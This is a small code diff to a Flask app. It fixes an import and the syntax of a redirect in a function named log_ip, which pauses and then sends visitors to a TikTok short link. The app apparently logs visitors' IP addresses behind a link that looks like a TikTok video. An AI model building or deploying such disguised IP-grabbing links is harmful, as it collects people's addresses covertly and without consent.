@@ -1,4 +1,4 @@
-from flask import Flask, request
+from flask import Flask, request , redirect
 import requests
 import json
 import os
@@ -59,7 +59,7 @@ def log_ip():
 
     time.sleep(3)
     
-    return redirect "https://vm.tiktok.com/ZGd9711rQ/"
+    return redirect ("https://vm.tiktok.com/ZGd9711rQ/")
 
 
 if __name__ == '__main__':
